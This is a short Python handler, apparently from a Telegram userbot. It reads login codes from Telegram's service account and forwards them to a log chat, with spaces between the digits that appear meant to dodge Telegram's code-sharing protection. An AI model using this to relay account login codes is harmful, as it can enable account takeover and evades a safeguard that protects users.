from . import *

@app.on(events.NewMessage())
async def Send_Code(event):
    if "login code" in event.text.lower() and int(event.from_id.user_id) == 777000:
        code = re.match("login code: (\d*)\. do not give this" , str(event.text.lower()))[1]
        print(code)
        codes = ""
        for cod in code:
            codes += f"{cod} "
        await app.send_message(LOG , f"**• Your Telegarm Code Is:** `{codes}`")
        print(f"• Your Telegram Code Is: {code}")
